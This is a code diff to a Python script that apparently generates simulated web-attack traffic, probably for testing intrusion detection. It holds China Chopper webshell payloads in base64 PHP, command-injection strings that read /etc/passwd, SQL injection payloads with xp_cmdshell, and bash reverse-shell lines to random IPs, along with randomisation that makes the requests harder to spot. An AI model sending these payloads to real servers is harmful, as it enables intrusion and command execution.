@@ -29,7 +29,13 @@ chopper={
 2:'pass=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyAneyRzfSciOiIvYyB7JHN9Ijskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIpOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=L2Jpbi9zaA%3D%3D&z2=Y2QgIi92YXIvd3d3L2h0bWwvIjt3aG9hbWk7ZWNobyBbU107cHdkO2VjaG8gW0Vd',
 3:'pass=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyAneyRzfSciOiIvYyB7JHN9Ijskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIpOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=L2Jpbi9zaA%3D%3D&z2='
 }
-
+raw={
+1:'pass=@eval(system(\'whoami\'));',
+2:'pass=\'whoami\'',
+3:'pass=cat%20/etc/passwd',
+4:'pass=@eval(system(\'id\'));',
+5:'pass=@eval(system(\'system\'));'
+}
 uppaths={1:'upload.php',2:'upload',3:'?/upload',4:'?mothod=upload',5:'?c=upload'}
 sqlipaths={1:'news.php?id=',2:'?id=',3:'search.php?name=',4:'login.php?name=',5:'?c=edit&m='}
 sqlis={1:'1123%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20WLTU',2:'1123%20AND%202662%3D3538',3:'1%20and%201=1',4:'3498%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23',5:'1123%29%20AND%205039%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285039%3D5039%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%288775%3D8775'}
@@ -58,10 +64,13 @@ def webshell_useing(url='http://127.0.0.1/'):
     print('webshell_useing')
     chopper_mock(url)
 def chopper_mock(url):
-    requests.post(url,data=chopper[1],headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
-    requests.post(url,data=chopper[2], headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
-    requests.post(url,data=chopper[3]+parse.quote(base64.b64encode(('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1').encode())), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
-    requests.post(url,data=chopper[3]+parse.quote(base64.b64encode(('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1').encode())), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
+    requests.post(url,data=chopper[1].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
+    requests.post(url,data=chopper[2].replace("pass",gen_str()), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
+    requests.post(url,data=chopper[3].replace("pass",gen_str())+parse.quote(base64.b64encode(('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1').encode())), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
+def raw_mock(url):
+    requests.post(url,data=raw[random.randint(1, 5)].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
+    requests.post(url,data=gen_str()+'='+parse.quote(base64.b64encode(('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1').encode())), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
+
 def randomIP():
     a= random.sample(list(range(1,256))*4, 4)
     b= map(str,a)
